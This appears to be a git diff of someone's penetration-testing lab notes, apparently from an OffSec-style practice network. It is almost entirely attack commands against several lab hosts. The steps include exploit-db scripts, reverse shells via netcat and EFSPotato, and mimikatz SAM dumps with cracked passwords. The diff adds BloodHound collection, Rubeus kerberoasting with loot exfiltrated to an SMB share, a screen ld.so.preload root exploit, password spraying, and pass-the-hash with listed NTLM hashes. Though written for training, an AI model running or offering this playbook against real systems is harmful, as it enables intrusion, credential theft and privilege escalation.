@@ -14,7 +14,7 @@ gobuster dir -u http://192.168.193.141 -w /usr/share/wordlists/dirbuster/directo
 # determined that the admin username field was vulnerable to sqli, but could not manually do SQL injection
 # Look up Attendance and Payroll system on exploit-db find and modify https://www.exploit-db.com/exploits/50801 to use the correct paths and get a shell, also modify shell body to be /home/kali/relia/shell.php
 
-python3 50801.py http://192.168.193.141:81
+python3 50801.py http://192.168.225.141:81
 nc -nvlp 1234
 
 Get-Childitem –Path C:\ -Include local.txt -File -Recurse -ErrorAction SilentlyContinue
@@ -46,9 +46,10 @@ C:\Users\All Users\ssh\ssh_host_rsa_key.pub
 iwr -uri http://192.168.45.219/efspotato.cs -Outfile efspotato.cs
 C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe efspotato.cs
 iwr -uri http://192.168.45.219/nc.exe -Outfile nc.exe
+
 .\efspotato.exe "nc.exe 192.168.45.219 9999 -e cmd"
 ```
-.14 post exploitation
+.141 post exploitation
 ```
 iwr -uri http://192.168.45.219:8000/mimikatz.exe -Outfile mimikatz.exe
 . .\mimikatz.exe
@@ -63,7 +64,21 @@ lsadump::sam
 # support hash - d9358122015c5b159574a88b3c0d2071 - cracked: Freedom1
 # Administrator hash - 3c4495bbd678fac8c9d218be4f2bbc7b - cracked: December31 
 
-# TEST
+# get domain info
+iwr -uri http://192.168.45.219/SharpHound.ps1 -Outfile SharpHound.ps1
+powershell -ep bypass
+Import-Module .\Sharphound.ps1
+Invoke-BloodHound -CollectionMethod All
+
+impacket-smbserver -smb2support smb smb 
+
+net use \\192.168.45.219\smb
+copy 20231205092228_BloodHound.zip \\192.168.45.219\smb
+bloodhound
+
+iwr -uri http://192.168.45.219/Rubeus.exe -Outfile Rubeus.exe
+.\Rubeus.exe kerberoast /outfile:hashes.kerberoast
+copy hashes.kerberoast \\192.168.45.219\smb
 ```
 
 .143
@@ -103,12 +118,6 @@ python3 cve2020-13151.py --ahost 192.168.193.143 --lhost 192.168.45.219 --lport 
 
 https://github.com/DominicBreuker/pspy
 wget https://github.com/DominicBreuker/pspy/releases/download/v1.2.0/pspy64
-
-# find screen unusual binary from linpeas
-https://www.exploit-db.com/exploits/41154
-https://0xdf.gitlab.io/2020/09/10/htb-haircut.html
-
-
 ```
 
 .143 privesc
@@ -134,10 +143,17 @@ cp libhax.so /home/kali/lab1/
 cp rootshell /home/kali/lab1/
 
 # download files to target
+cd /tmp
 wget http://192.168.45.219/libhax.so
 wget http://192.168.45.219/rootshell
 
-screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/home/aero/libhax.so"
+# run exploit
+cd /etc
+umask 000
+screen -D -m -L ld.so.preload echo -ne "\x0a/tmp/libhax.so"
+cat ld.so.preload
+screen -ls
+/tmp/rootshell # this gets us the root shell
 ```
 
 .144
@@ -145,6 +161,7 @@ screen-4.5.0 -D -m -L ld.so.preload echo -ne "\x0a/home/aero/libhax.so"
 nmap 192.168.193.144
 nmap -sT -A -Pn -p 80 192.168.193.144
 gobuster dir -u http://192.168.193.144 -w /usr/share/wordlists/dirb/big.txt
+
 # find that it is running joomla CMS
 # also find a git repo that includes a security update
 joomscan -u http://192.168.193.144
@@ -176,4 +193,21 @@ another user: chloe
 su chloe # enter password
 sudo -l
 sudo su
+```
+
+.145
+```
+nmap 192.168.225.145
+nmap -sT -A -Pn -p 80 192.168.225.145
+gobuster dir -u http://192.168.225.145 -w /usr/share/wordlists/dirb/big.txt
+
+# did not work
+crackmapexec smb 192.168.225.145 -u Administrator -p 'December31' --continue-on-success
+crackmapexec smb 192.168.225.145 -u support -p 'Freedom1' --continue-on-success
+crowbar -b rdp -s 192.168.225.145/32 -u Administrator -C passwords.txt -n 1
+
+# try pass the hash
+impacket-psexec -hashes :e728ecbadfb02f51ce8eed753f3ff3fd celia.almeda@192.168.225.145
+impacket-psexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.145
+impacket-wmiexec -hashes :9a3121977ee93af56ebd0ef4f527a35e mary.williams@192.168.225.141
 ```
